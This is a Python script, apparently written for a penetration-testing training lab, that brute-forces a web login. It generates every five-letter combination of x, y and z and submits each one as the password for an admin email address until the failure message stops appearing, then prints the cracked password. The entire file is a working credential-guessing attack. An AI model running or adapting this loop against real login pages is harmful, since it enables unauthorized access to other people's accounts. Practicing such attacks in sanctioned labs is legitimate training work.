from urllib.request import urlopen
password=[]
for a in ['x','y','z']:
    for b in ['x','y','z']:
        for c in ['x','y','z']:
            for d in ['x','y','z']:
                for e in ['x','y','z']:
                     password.append(a+b+c+d+e)
url="http://pentesteracademylab.appspot.com/lab/webapp/1?email=admin%40pentesteracademy.com&password="
for x in password:
    response= urlopen(url+x)
    if 'Failed! Please try again!' in response.read().decode('utf-8'):

        print("Password ",x," Fail");
    else:
        print ("Challenge Cracked")
        print ("Password: ",x)
        break;
    response.close()
    
